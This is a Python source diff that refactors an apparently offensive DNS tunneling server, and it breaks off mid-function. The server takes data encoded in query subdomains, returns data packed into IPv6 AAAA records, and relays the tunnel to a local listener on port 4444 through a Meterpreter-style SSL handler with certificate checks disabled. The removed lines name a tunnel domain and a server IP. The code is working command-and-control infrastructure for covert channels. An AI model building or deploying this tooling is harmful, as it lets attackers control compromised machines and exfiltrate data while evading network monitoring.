@@ -14,6 +14,7 @@ import ssl
 import Queue
 import copy
 import base64
+import logging
 
 try:
     from dnslib import *
@@ -21,9 +22,38 @@ except ImportError:
     print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
     sys.exit(2)
 
+
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger("dns_server")
+
+
+def pack_byte_to_hn(val):
+    """
+    Pack byte to network order unsigned short
+    """
+    return (val << 8) & 0xffff
+
+
+def pack_2byte_to_hn(low_byte, high_byte):
+    """
+    Pack 2 bytes to network order unsigned short
+    """
+    return ((low_byte << 8) | high_byte) & 0xffff
+
+
+def pack_ushort_to_hn(val):
+    """
+    Pack unsigned short to network order unsigned short
+    """
+    return ((val & 0xff) << 8) | ((val & 0xff00) >> 8) & 0xffff
+
+
+def xor_bytes(key, data):
+    return ''.join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))
+
+
 class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
     pass
-
 
 
 class DomainName(str):
@@ -31,17 +61,18 @@ class DomainName(str):
         return DomainName(item + '.' + self)
 
 
-        
-class DNSTunnelResponse():
+class IPv6Encoder():
+    MAX_IPV6RR_NUM = 17
+    MAX_DATA_IN_RR = 14
+    MAX_PACKET_SIZE = MAX_IPV6RR_NUM * MAX_DATA_IN_RR
+    IPV6_FORMAT = ":".join(["{:04x}"]*8)
+
     @staticmethod
-    def inc(pointer):
-        lst = [ord(x) for x in list(pointer)]
-
+    def get_next_sdomain(current_sdomain):
+        lst = [ord(x) for x in current_sdomain]
         lst[-1] += 1
-
         if lst[-1] > 122:
             lst[-1] = 97
-
             lst[-2] += 1
             if lst[-2] > 122:
                 lst[-2] = 97
@@ -54,343 +85,421 @@ class DNSTunnelResponse():
 
         return ''.join([chr(x) for x in lst])
 
-    def __init__(self, data, start = 'aaaa'):
+    @staticmethod
+    def _encode_nextdomain_datasize(next_domain, data_size):
+        res = [0xfe81]
+        for ch in next_domain:
+            res.append(pack_byte_to_hn(ord(ch)))
+        res.append(pack_2byte_to_hn(0 if data_size <= IPv6Encoder.MAX_PACKET_SIZE else 1, data_size & 0xff))
+        res.append(pack_ushort_to_hn(data_size >> 8 & 0xffff))
+        res.append(pack_byte_to_hn(data_size >> 24 & 0xff))
+        return res
 
-        self.ansx = []  # Block of IPv6 addresses
-        max_size = 14 * 17
-        cur_seq = start
-        self.cur_seq1 = DNSTunnelResponse.inc(cur_seq)
+    @staticmethod
+    def _encode_data_prefix(prefix, index, data):
+        assert(len(data) <= IPv6Encoder.MAX_DATA_IN_RR)
+        assert(index < IPv6Encoder.MAX_IPV6RR_NUM)
+        res = []
+        data_size = len(data)
+        res.append(pack_2byte_to_hn(prefix, (index << 4 if index < 16 else 0) | data_size))
+        for i in range(data_size//2):
+            res.append(pack_2byte_to_hn(ord(data[i*2]), ord(data[i*2 + 1])))
+        if data_size % 2 != 0:
+            res.append(pack_byte_to_hn(ord(data[data_size-1])))
+        return res
 
-        # next domain name
-        ip_seq = "fe81:" + '00:'.join([hex(ord(x))[2:].zfill(2) for x in list(self.cur_seq1)]) +  '00:'
+    @staticmethod
+    def _align_hextets(hextests):
+        l = len(hextests)
+        if l < 8:
+            hextests += [0] * (8-l)
+        return hextests
 
-        cntx = 0
-        t_size = len(data) # TLV size
+    @staticmethod
+    def hextets_to_str(hextets):
+        return IPv6Encoder.IPV6_FORMAT.format(*IPv6Encoder._align_hextets(hextets))
 
-        if t_size <= max_size:
-            ip_seq += "00" # Last block
-        else:
-            ip_seq += "01" # More blocks will be added
+    @staticmethod
+    def encode_senddata_header(sub_domain, data_size):
+        return [IPv6Encoder.hextets_to_str(IPv6Encoder._encode_nextdomain_datasize(sub_domain, data_size))]
 
-        # overall size
-        hex_sz = (hex(t_size)[2:]).zfill(8)
-        ip_seq += hex_sz[6:8] + ":" + hex_sz[4:6] + hex_sz[2:4] + ":" + hex_sz[0:2] + "00"
+    @staticmethod
+    def encode_data(data):
+        logger.info("Encoding data...")
+        ipv6blocks = []  # Block of IPv6 addresses
+        data_size = len(data)
+        logger.debug("Data size - %d bytes", data_size)
+        index = 0
+        while index < data_size:
+            block = []
+            next_index = index + IPv6Encoder.MAX_PACKET_SIZE
+            if next_index < data_size:
+                # full block
+                for i in range(IPv6Encoder.MAX_IPV6RR_NUM):
+                    is_last = (i == (IPv6Encoder.MAX_IPV6RR_NUM - 1))
+                    cur_pos = index + i * IPv6Encoder.MAX_DATA_IN_RR
+                    hextets = IPv6Encoder._encode_data_prefix(0xfe if is_last else 0xff,
+                                                              i, data[cur_pos:cur_pos + IPv6Encoder.MAX_DATA_IN_RR])
+                    block.append(IPv6Encoder.hextets_to_str(hextets))
+            else:
+                # partial block
+                i = 0
+                block_size = data_size - index
+                while i < block_size:
+                    next_i = i + IPv6Encoder.MAX_DATA_IN_RR
+                    if next_i > block_size:
+                        next_i = block_size
+                    num_rr = i // IPv6Encoder.MAX_DATA_IN_RR
+                    is_last = (num_rr == (IPv6Encoder.MAX_IPV6RR_NUM - 1))
+                    cur_pos = index + i
+                    hextets = IPv6Encoder._encode_data_prefix(0xfe if is_last else 0xff,
+                                                              num_rr, data[cur_pos:cur_pos + (next_i-i)])
+                    block.append(IPv6Encoder.hextets_to_str(hextets))
+                    i = next_i
 
-        # DNS Header added
-        #self.ansx[cur_seq] = []
-        self.ansx.append([ip_seq])
-        self.ansx.append([])
-        cntx += 1
+            ipv6blocks.append(block)
+            index = next_index
+        logger.info("Encoding done. %d ipv6 blocks generated", len(ipv6blocks))
+        logger.debug("IPv6Blocks data: %s", ipv6blocks)
+        return ipv6blocks
 
-        # Now we are going to encode data
+    @staticmethod
+    def encode_ready_receive():
+        return ["ffff:0000:0000:0000:0000:0000:0000:0000"]
 
-        #how many IP blocks we need
-        iter_big = t_size / max_size
-        if (t_size % max_size):
-            iter_big += 1
+    @staticmethod
+    def encode_finish_send():
+        return ["ffff:0000:0000:0000:0000:ff00:0000:0000"]
 
-        curr_point = 0
-
-        for_pack = data[curr_point:max_size]
-        x_size = len(for_pack)
-
-        while True:
-            pcs = x_size / 14
-            pcs_ = x_size % 14
-
-            output = list(for_pack)
-
-            i = 0
-            while i < pcs:
-                part = []
-                y = 0
-                while y < 14:
-                    part.append(
-                      ''.join([hex(ord(x))[2:].zfill(2) for x in output[(i * 14) + y:(i * 14) + y +2]])
-                    )
-                    y += 2
-
-                outputX = ('ff' if i < 16 else 'fe') + hex((i if i < 16 else 0))[2:].zfill(1) + 'e:' + ':'.join(part)
-                self.ansx[-1].append(outputX)
-                cntx += 1
-
-                i +=1
-
-            # Rest data
-
-            if pcs_ != 0:
-                part = []
-                if pcs_ % 2 != 0:
-                    output2 = output[pcs * 14:(pcs * 14) + pcs_ ]
-                    y = 0
-                    while y < pcs_:
-                        part.append(
-                          ''.join([hex(ord(x))[2:].zfill(2) for x in output2[y: y +2]])
-                        )
-                        y += 2
-
-                    part[-1] += '00'
-
-                else:
-                    output2 = output[pcs * 14:(pcs * 14)+ pcs_ + 1]
-                    y = 0
-                    while y < pcs_:
-                        part.append(
-                          ''.join([hex(ord(x))[2:].zfill(2) for x in output2[y: y +2]])
-                        )
-                        y += 2
-                print part
-                end_t = ':0000' * (7 - len(part))
-                outputX = ('ff' if i < 16 else 'fe') + hex((i if i < 16 else 0))[2:].zfill(1) + hex(pcs_)[2:].zfill(1) + ':' + ':'.join(part) + end_t
-                self.ansx[-1].append(outputX)
-                cntx += 1
-            t_size -= x_size
-            curr_point += x_size
-
-            if t_size !=0 :
-                #cur_seq = DNSTunnelResponse.inc(cur_seq)
-                #self.cur_seq1 = DNSTunnelResponse.inc(cur_seq)
-
-                # Next block and header
-                #ip_seq = 'fe81:' + '00:'.join([hex(ord(x))[2:].zfill(2) for x in list(self.cur_seq1)]) + '00:'
-
-                cntx = 0
-                for_pack = data[curr_point:curr_point + max_size]
-                x_size = len(for_pack)
-
-                #if t_size <= max_size:
-                #    ip_seq += "03" # Last block
-                #else:
-                #    ip_seq += "02" # More blocks will be added
-
-                #ip_seq += '00:0000:0000'
-                self.ansx.append([])
-                cntx += 1
-            print i
-            print t_size
-            if t_size == 0:
-                break
-
-    def get_ipv6(self):
-        return self.ansx
-
-D = DomainName('0x41.ws.')
-IP = '54.194.143.85'
+    @staticmethod
+    def encode_send_more_data():
+        return ["ffff:0000:0000:0000:0000:f000:0000:0000"]
 
 
-ns_records = []
 LPORT = 4444
 CONNECTED = False
 
 servers = []
-
-TLV_REQ = {'current':'aaaa','status':1,'data':[]}
-TLV_RES = {'rdy': False}
-
-MAX_SIZE = 14 * 16 # Maximum size of DNS reponse (IPv6)
+_clients = {}
+dns_server = None
 
 
+def get_client_by_id(client_id):
+    if client_id in _clients:
+        return _clients[client_id]
 
-def add_meter_request(data):
-    global TLV_REQ
-    while TLV_REQ['status']!=1:
-        time.sleep(0.1)
-    print("NEW REQUEST: GOGO! " + TLV_REQ['current'])
-    print " ".join([ hex(ord(ch))[2:] for ch in data ])
-    TLV_REQ['data'] = DNSTunnelResponse(data, TLV_REQ['current']).get_ipv6()
-    TLV_REQ['status'] = 2
 
-    return True
+def register_client(client_id, client):
+    if client_id in _clients:
+        logger.warning("Clients exists alredy. Rewriting it.")
+    _clients[client_id] = client
 
-def get_meter_response(wait=600):
-    global TLV_RES
-    zero = 0
-    print "WAITING FOR RESPONSE"
-    while not bool(TLV_RES['rdy']) and zero < (wait * 10):
-        time.sleep(0.1)
-        zero += 1
-    if 'full_in' in TLV_RES:
-        print "GOT RESPONSE"
-        data = TLV_RES['full_in']
-    else:
-        print "NO RESPONSE"
+
+class Client(object):
+    INITIAL = 1
+    INCOMING_DATA = 2
+
+    def __init__(self, name):
+        register_client(name, self)
+        self.state = self.INITIAL
+        self.received_data_size = 0
+        self.logger = logging.getLogger(self.__class__.__name__)
+        self.logger.setLevel(logging.DEBUG)
+        self.received_data = ""
+        self.last_received_index = -1
+        self.sub_domain = "aaaa"
+        self.send_data = ""
+        self.enc_send_data = []
+        self.send_indexes = set()
+        self.server_queue = Queue.Queue()
+        self.client_queue = Queue.Queue()
+
+    def _setup_receive(self, exp_data_size, padding):
+        self.state = self.INCOMING_DATA
+        self.received_data_size = exp_data_size
+        self.padding = padding
+        self.received_data = ""
+        self.last_received_index = -1
+
+    def _initial_state(self):
+        self.state = self.INITIAL
+        self.received_data = ""
+        self.padding = 0
+        self.last_received_index = -1
+        self.received_data_size = 0
+
+    def incoming_data_header(self, data_size, padding):
+    
+        if self.received_data_size == data_size and self.state == self.INCOMING_DATA:
+            self.logger.info("Dublicated header request: waiting %d bytes of data with padding %d", data_size, padding)
+            return IPv6Encoder.encode_ready_receive()
+        elif self.state == self.INCOMING_DATA:
+            self.logger.error("Bad request. Client in the receiving data state")
+            return None
+        self.logger.info("Data header: waiting %d bytes of data with padding %d", data_size, padding)
+        self._setup_receive(data_size, padding)
+        return IPv6Encoder.encode_ready_receive()
+
+    def incoming_data(self, data, index, counter):
+        self.logger.debug("Data %s, padding %d, index %d", data, index, counter)
+        if self.state != self.INCOMING_DATA:
+            self.logger.error("Bad state(%d) for this action. Send finish.", self.state)
+            return IPv6Encoder.encode_finish_send()
+
+        data_size = len(data)
+
+        if data_size == 0:
+            self.logger.error("Empty incoming data. Send finish.")
+            return IPv6Encoder.encode_finish_send()
+
+        if self.last_received_index >= index:
+            self.logger.info("Dublicated packet.")
+            return IPv6Encoder.encode_send_more_data()
+
+        if len(self.received_data) + data_size > self.received_data_size:
+            self.logger.error("Overflow.Something was wrong. Send finish and clear all received data.")
+            self._initial_state()
+            return IPv6Encoder.encode_finish_send()
+
+        self.received_data += data
+        self.last_received_index = index
+        if len(self.received_data) == self.received_data_size:
+            self.logger.info("All expected data is received")
+            try:
+                packet = base64.b32decode((self.received_data + "=" * self.padding).upper())
+                self.logger.info("Put decoded data to the server queue")
+                self.server_queue.put(packet)
+                self._initial_state()
+            except Exception:
+                self.logger.error("Error during decode received data", exc_info=True)
+                self._initial_state()
+                return IPv6Encoder.encode_finish_send()
+        return IPv6Encoder.encode_send_more_data()
+
+    def request_data_header(self, sub_domain):
+        if sub_domain == self.sub_domain:
+            data_size = len(self.send_data)
+            if data_size == 0 and (len(self.enc_send_data) == 0 or len(self.send_indexes) == len(self.enc_send_data)):
+                data = None
+                try:
+                    self.logger.info("Checking client queue...")
+                    data = self.client_queue.get_nowait()
+                    self.logger.debug("New data size is %d", len(data))
+                except Queue.Empty:
+                    pass
+                if data is not None:
+                    self.logger.info("There are new data for sending to client")
+                    self.send_data = data
+            data_size = len(self.send_data)
+            if data_size != 0:
+                next_sub = IPv6Encoder.get_next_sdomain(self.sub_domain)
+                sub_domain = next_sub
+                self.enc_send_data = IPv6Encoder.encode_data(self.send_data)
+                self.send_indexes = set()
+                self.send_data = ""
+            else:
+                self.logger.info("No data for client.")
+            self.logger.info("Send data header to client with domain %s and size %d", sub_domain, data_size)
+            return IPv6Encoder.encode_senddata_header(sub_domain, data_size)
+        else:
+            self.logger.info("Subdomain is different %s(request) - %s(client)", sub_domain, self.sub_domain)
+            if sub_domain == "aaaa":
+                self.logger.info("MIGRATE. Not DONE")
+            else:
+                self.sub_domain = sub_domain
+                self.send_data = ""
+                self.enc_send_data = ""
+
+    def request_data(self, sub_domain, index):
+        self.logger.debug("request_data - %s, %d", sub_domain, index)
+        if sub_domain != self.sub_domain:
+            self.logger.error("request_data: subdomains are not equal(%s-%s)", self.sub_domain, sub_domain)
+            return None
+        lst_size = len(self.enc_send_data)
+        if index < lst_size:
+            self.logger.debug("request_data: return data %s", self.enc_send_data[index])
+            self.send_indexes.add(index)
+            return self.enc_send_data[index]
+        else:
+            self.logger.error("request_data: index(%d) out of range (0,%d)", index, lst_size)
+
+    def server_put_data(self, data):
+        self.logger.info("Server adds data to queue.")
+        self.client_queue.put(data)
+
+    def server_get_data(self, timeout=2):
+        self.logger.info("Checking server queue...")
         data = None
-    TLV_RES = {'rdy': False}
-    return data
+        try:
+            data = self.server_queue.get(True, timeout)
+            self.logger.info("There are new data(length=%d) for the server", len(data))
+        except Queue.Empty:
+            pass
+        return data
 
-def xor_bytes(key, data):
-    return ''.join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))
+
+class Request(object):
+    EXPR = None
+    LOGGER = logging.getLogger("Request")
+
+    @classmethod
+    def match(cls, qname):
+        if cls.EXPR:
+            return cls.EXPR.match(qname)
+
+    @classmethod
+    def handle(cls, qname):
+        m = cls.match(qname)
+        if not m:
+            return None
+        client_id = m.group("client")
+        client = get_client_by_id(client_id)
+        if client is not None:
+            Request.LOGGER.info("Request will be handled by class %s", cls.__name__)
+            return cls._handle_client(client, m)
+        else:
+            Request.LOGGER.error("Can't find client with name %s", client_id)
+        return None
+
+    @classmethod
+    def _handle_client(cls, client, match_data):
+        raise NotImplementedError()
+
+
+class GetDataHeader(Request):
+    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.g\.(?P<rnd>\d+)\.(?P<client>\w)")
+
+    @classmethod
+    def _handle_client(cls, client, match_data):
+        sub_domain = match_data.group('sub_dom')
+        return client.request_data_header(sub_domain)
+
+
+class GetDataRequest(Request):
+    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.(?P<index>\d+)\.(?P<rnd>\d+)\.(?P<client>\w)")
+
+    @classmethod
+    def _handle_client(cls, client, match_data):
+        sub_domain = match_data.group('sub_dom')
+        index = int(match_data.group('index'))
+        return client.request_data(sub_domain, index)
+
+
+class IncomingDataRequest(Request):
+    EXPR = re.compile(r"t\.(?P<base32>.*)\.(?P<idx>\d+)\.(?P<cnt>\d+)\.(?P<client>\w)")
+
+    @classmethod
+    def _handle_client(cls, client, match_data):
+        enc_data = match_data.group('base32')
+        index = int(match_data.group('idx'))
+        counter = int(match_data.group('cnt'))
+        enc_data = re.sub(r"\.", "", enc_data)
+        #enc_data = re.sub(r"\-", "+", enc_data)
+        #enc_data = re.sub(r"\_", "/", enc_data)
+        return client.incoming_data(enc_data, index, counter)
+
+
+class IncomingDataHeaderRequest(Request):
+    EXPR = re.compile(r"(?P<size>\d+)\.(?P<padd>\d+)\.tx\.(?P<rnd>\d+)\.(?P<client>\w)")
+
+    @classmethod
+    def _handle_client(cls, client, match_data):
+        size = int(match_data.group('size'))
+        padding = int(match_data.group('padd'))
+        return client.incoming_data_header(size, padding)
+
+
+class AAAARequestHandler(object):
+    def __init__(self, domain):
+        self.domain = domain
+        self.logger = logging.getLogger(self.__class__.__name__)
+        self.logger.setLevel(logging.DEBUG)
+        self.request_handler = [
+            IncomingDataHeaderRequest,
+            IncomingDataRequest,
+            GetDataRequest,
+            GetDataHeader
+        ]
+
+    def process_request(self, reply, qname):
+        # cut domain from requested qname
+        i = qname.rfind("." + self.domain)
+        if i == -1:
+            self.logger.error("Bad request: can't find domain %s in %s", self.domain, qname)
+            return
+        sub_domain = qname[:i]
+        self.logger.debug("requested subdomain name is %s", qname)
+        is_handled = False
+        for handler in self.request_handler:
+            answer = handler.handle(sub_domain)
+            if answer is not None:
+                for rr in answer:
+                    self.logger.debug("Add resource record to the reply %s", rr)
+                    reply.add_answer(RR(rname=qname, rtype=QTYPE.AAAA, rclass=1, ttl=TTL,
+                                        rdata=AAAA(rr)))
+                is_handled = True
+                break
+        if not is_handled:
+            self.logger.error("Request with subdomain %s doesn't handled", qname)
+
+
+class DnsServer(object):
+    def __init__(self, domain, ipv4, ns_servers):
+        self.domain = domain + "."
+        self.ipv4 = ipv4
+        self.ns_servers = ns_servers
+        self.logger = logging.getLogger(self.__class__.__name__)
+        self.handlers = {
+            QTYPE.NS: self._process_ns_request,
+            QTYPE.A: self._process_a_request,
+            QTYPE.AAAA: self._process_aaaa_request,
+        }
+        self.aaaa_handler = AAAARequestHandler(self.domain)
+
+    def process_request(self, request):
+        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+        qname = request.q.qname
+        qn = str(qname)
+        qtype = request.q.qtype
+        qt = QTYPE[qtype]
+        if qn.endswith(self.domain):
+            if qtype in self.handlers:
+                self.logger.info("Process request for type %s", qt)
+                self.handlers[qtype](reply, qn)
+            else:
+                self.logger.info("%s request type is not supported", qt)
+        else:
+            self.logger.info("DNS request for domain %s is not handled by this server. Sending empty answer.", qn)
+        self.logger.info("Send reply for DNS request")
+        self.logger.debug("Reply data: %s", reply)
+        return reply.pack()
+
+    def _process_ns_request(self, reply, qname):
+        for server in self.ns_servers:
+            reply.add_answer(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=server))
+
+    def _process_a_request(self, reply, qname):
+        reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(self.ipv4)))
+
+    def _process_aaaa_request(self, reply, qname):
+        if self.aaaa_handler is not None:
+            self.aaaa_handler.process_request(reply, qname)
+
 
 def dns_response(data):
-
     try:
         request = DNSRecord.parse(data)
-        return dns_response_(request)
+        if dns_server:
+            return dns_server.process_request(request)
+        else:
+            logger.error("Dns server is not created.")
+            return None
     except Exception as e:
-        print "Parse error " + str(e)
+        logger.error("Parse error " + str(e), exc_info=True)
         return None
 
 
-def dns_response_(request):
-    global CONNECTED
-    global LPORT
-    global TLV_REQ
-    global TLV_RES
-    print("\n\nINCOMING: ")
-
-    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
-
-    qname = request.q.qname
-    qn = str(qname)
-    qtype = request.q.qtype
-    qt = QTYPE[qtype]
-
-    #if qn == D or qn.endswith('.' + D):
-    #
-    #    for name, rrs in records.items():
-    #        if name == qn:
-    #            for rdata in rrs:
-    #                rqt = rdata.__class__.__name__
-    #                if qt in ['*', rqt]:
-    #                    reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))
-    #
-    #    for rdata in ns_records:
-    #        reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
-    #
-    #    reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
-
-    if qn.endswith('.' + D) and qtype==QTYPE.AAAA:
-        print ("Connected status:" + str(CONNECTED))
-        if not CONNECTED:
-            servers.append(ThreadedTCPServer(('', LPORT),MeterBaseRequestHandler))
-            thread = threading.Thread(target=servers[-1].serve_forever)  # that thread will start one more thread for each request
-            thread.daemon = True  # exit the server thread when the main thread terminates
-            thread.start()
-            print("%s server loop running in thread: %s" % (servers[-1].RequestHandlerClass.__name__[:3], thread.name))
-            CONNECTED = True
-        print("IN REQ: " + qn)
-
-        mx = re.match(r"(?P<sub_dom>\w{4})\.g\.(?P<rnd>\d+)\.(?P<client>\w)\." + D, qn)
-        mc = re.match(r"(?P<sub_dom>\w{4})\.(?P<index>\d+)\.(?P<rnd>\d+)\.(?P<client>\w)\." + D, qn)
-
-        if mc and TLV_REQ['current']==mc.group('sub_dom') and TLV_REQ['status'] > 2:
-            print "RETURN IP"
-            idx_req = int(mc.group('index'))
-            TLV_REQ['status'] += 1
-            for ip in TLV_REQ['data'][idx_req + 1]:
-                #print("  "+str(idx_req+1)+ " "+ ip)
-                reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA(ip)) )
-        elif mx and mx.group('sub_dom') == "aaaa" and TLV_REQ['current']!='aaaa':
-            print "MIGRATE"
-            if TLV_REQ['status'] == 2:
-                temp = copy.deepcopy(TLV_REQ['data'])
-                TLV_REQ = {'current':'aaaa','status':2} # Ready for get
-                TLV_REQ['data'] = temp
-            else:
-                TLV_REQ = {'current':'aaaa','status':1,'data':[]} # Ready to recieve
-            TLV_RES = {'rdy': False}
-            curr_sub_ = "aaaa"
-            reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("fe81:" + hex(ord(curr_sub_[0]))[2:].zfill(2) +"00:" + hex(ord(curr_sub_[1]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[2]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[3]))[2:].zfill(2) +"00:0000:0000:0000")))
-
-        elif mx and TLV_REQ['current']==mx.group('sub_dom') and TLV_REQ['status'] == 1:
-            print "Return WAITING for " + mx.group('sub_dom')
-            curr_sub_ = mx.group('sub_dom')
-            reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("fe81:" + hex(ord(curr_sub_[0]))[2:].zfill(2) +"00:" + hex(ord(curr_sub_[1]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[2]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[3]))[2:].zfill(2) +"00:0000:0000:0000")))
-
-        elif mx and TLV_REQ['current']==mx.group('sub_dom') and TLV_REQ['status'] > 1: # Return header
-            print("Return DATA for" + mx.group('sub_dom'))
-            print "\t RETURN HEADER" + str(TLV_REQ['data'][0][0])
-            TLV_REQ['status'] = 3
-            reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA(TLV_REQ['data'][0][0])))
-
-        elif mx and  TLV_REQ['current'] != mx.group('sub_dom'): # New data
-            #TLV_REQ = {}
-            TLV_REQ['current'] = mx.group('sub_dom')
-            TLV_REQ['status'] = 1
-            TLV_RES = {'rdy': False}
-            print("Return WAITING (create) for " + mx.group('sub_dom'))
-            curr_sub_ = mx.group('sub_dom')
-            reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("fe81:" + hex(ord(curr_sub_[0]))[2:].zfill(2) +"00:" + hex(ord(curr_sub_[1]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[2]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[3]))[2:].zfill(2) +"00:0000:0000:0000")))
-        else:
-            m1 = re.match(r"t\.(?P<base64>.*)\.(?P<padd>\d+)\.(?P<idx>\d+)\.(?P<client>\w)\." + D, qn)
-            if m1 and 'recieved_in' in TLV_RES:
-                print("INDATA: DATA CAME")
-                base_in = m1.group('base64')
-                index_in = int(m1.group('idx'))
-
-                padding = "" + ("=" * int(m1.group('padd')))
-
-                base_in = re.sub(r"\.", "", base_in)
-                base_in = re.sub(r"\-", "+", base_in)
-                base_in = re.sub(r"\_", "/", base_in)
-
-                lnx = len(base_in)
-
-                print "\nsize: " + str(TLV_RES['size_in']) + " index: " + str(index_in) + " length " + str(lnx) + " base64: " + base_in + " padd:" +  str(padding) +"\n";
-
-                if TLV_RES['size_in'] > 0:
-
-                    print "\n old: " + str(TLV_RES['index_last']) + " vs " + str(index_in) + "\n"
-
-                    if (index_in <=  TLV_RES['index_last'] and TLV_RES['index_last'] - index_in < 64535):
-                        print "\ndbl\n"
-
-                    else:
-
-                        TLV_RES['base64'] += base_in
-                        TLV_RES['size_in']  -=  lnx
-                        TLV_RES['index_last'] =  index_in
-
-                        print "\nRCecieved " + str(index_in) + ":" + base_in;
-
-                    if (TLV_RES['size_in']  == 0):
-                        print "RECIEVED FULL PACKET\n";
-                        try:
-                            TLV_RES['full_in'] = base64.b64decode(TLV_RES['base64'] + padding);
-                            print TLV_RES['full_in']
-                        except Exception  as e:
-                            print TLV_RES['base64']
-                            print " ---> "
-                            print "Server ERROR " + str(e)
-                            TLV_RES['full_in']=""
-                        TLV_RES['rdy'] = True
-                        print("INDATA: OK, more")
-
-                    reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("ffff:0000:0000:0000:0000:f000:0000:0000")))
-
-                else:
-                    print("INDATA: FINISH")
-                    reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("ffff:0000:0000:0000:0000:ff00:0000:0000")))
-            elif m1:
-                reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("ffff:0000:0000:0000:0000:ff00:0000:0000")))
-            else:
-                m2 = re.match(r"(?P<size>\d+)\.tx\.(?P<rnd>\d+)\.(?P<client>\w)\." + D, qn)
-                if m2 and 'recieved_in' not in TLV_RES:
-                    print("INDATA: HEADER CAME")
-                    TLV_RES['size_in'] = int(m2.group('size'))
-                    TLV_RES['recieved_in'] = 0
-                    TLV_RES['index_last'] = -1
-                    TLV_RES['base64'] =  ""
-
-                    print("Ready to get " + str(TLV_RES['size_in']))
-                    reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("ffff:0000:0000:0000:0000:0000:0000:0000")))
-                else:
-                    print("Bad Request 1")
-
-
-    elif qn.endswith(D) and qtype==QTYPE.NS:
-        for rdata in ns_records:
-            reply.add_answer(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
-    elif qn.endswith(D) and qtype==QTYPE.A:
-        reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP)))
-    print("---- Reply:\n", reply)
-    #reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
-
-    return reply.pack()
-
-
 class BaseRequestHandlerDNS(SocketServer.BaseRequestHandler):
-
     def get_data(self):
         raise NotImplementedError
 
@@ -399,16 +508,17 @@ class BaseRequestHandlerDNS(SocketServer.BaseRequestHandler):
 
     def handle(self):
         now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
-        print("\n\n%s DNS request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
-                                               self.client_address[1]))
+        logger.info("%s DNS request %s (%s %s):", self.__class__.__name__[:3], now, self.client_address[0],
+                    self.client_address[1])
         try:
             data = self.get_data()
-            print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
+            logger.debug("Size:%d, data %s", len(data), data)
             dns_ans = dns_response(data)
             if dns_ans:
                 self.send_data(dns_ans)
         except Exception:
-            traceback.print_exc(file=sys.stderr)
+            logger.error("Exception", exc_info=True)
+
 
 class MeterBaseRequestHandler(SocketServer.BaseRequestHandler):
     def get_data(self):
@@ -422,98 +532,101 @@ class MeterBaseRequestHandler(SocketServer.BaseRequestHandler):
         buflen = 25600
 
         s = ssl.wrap_socket(self.request,
-          #keyfile = "server.key",
-          ca_certs = "server.crt",
-          cert_reqs = ssl.CERT_NONE,
-          server_side=False)
-         # server_side=True,
-          #ssl_version=ssl.PROTOCOL_SSLv23)
+                            # keyfile = "server.key",
+                            # ca_certs="server.crt",
+                            cert_reqs=ssl.CERT_NONE,
+                            server_side=False)
+        # server_side=True,
+        # ssl_version=ssl.PROTOCOL_SSLv23)
         s.setblocking(False)
         now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
-        print("\n\n%s TCP request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0], self.client_address[1]))
+        logger.info("%s TCP request %s (%s %s):", self.__class__.__name__[:3], now, self.client_address[0],
+                    self.client_address[1])
         try:
             data = s.recv(buflen)
         except ssl.SSLError as e:
             data = None
-        print "Read on empty client socket: {}".format(data)
+        logger.debug("Read on empty client socket: {}".format(data))
 
         s.write("GET /123456789 HTTP/1.0\r\n\r\n")
         # Give client a chance to write something
         time.sleep(0.5)
 
-        #Session
+        # Session
         while True:
             s.settimeout(0.5)
             try:
-                print("WAITING FOR THE HEADER")
-                data = s.recv(8) # get header
+                logger.info("WAITING FOR THE HEADER")
+                data = s.recv(8)  # get header
             except socket.timeout:
-                print "EPTY IN"
+                logger.info("EPTY IN")
                 data = None
             except ssl.SSLError, e:
                 if str(e) == "('The read operation timed out',)":
